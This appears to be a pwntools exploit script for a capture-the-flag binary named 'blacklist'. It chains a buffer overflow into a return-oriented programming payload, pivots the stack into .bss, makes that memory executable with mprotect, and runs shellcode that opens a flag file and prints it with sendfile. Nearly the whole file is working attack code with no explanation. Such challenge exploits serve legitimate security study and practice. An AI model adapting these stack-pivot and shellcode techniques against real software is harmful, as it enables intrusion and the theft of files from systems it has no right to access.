#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./blacklist")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x401dd3
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

bss = exe.bss(0x100)
flag_path = "/mnt/c/Shared/pwn/blacklist/flag.txt\x00"

call_rsp = 0x4159bb
pop_rsp = 0x401fab
pop_rax = 0x401daf
pop_rdi = 0x4017b6
pop_rsi = 0x4024f6
pop_rdx = 0x401db2
syscall = 0x41860c

payload = flat([
    "A"*0x48,

    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x100,
    syscall,

    pop_rsp, bss+len(flag_path)
    ])

stack_pivot = flat([
    pop_rax, 10,
    pop_rdi, 0x4d1000,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    syscall,

    call_rsp
    ])

shellcode = asm("""

    mov rax, 257
    mov rdi, 6
    mov rsi, {}
    xor rdx, rdx
    xor r10, r10
    syscall

    mov rsi, rax
    mov rax, 40
    mov rdi, 1
    mov r10, 20
    syscall
    """.format(bss))

sl(payload)
sleep(5)
sl(flag_path+stack_pivot+shellcode)

io.interactive()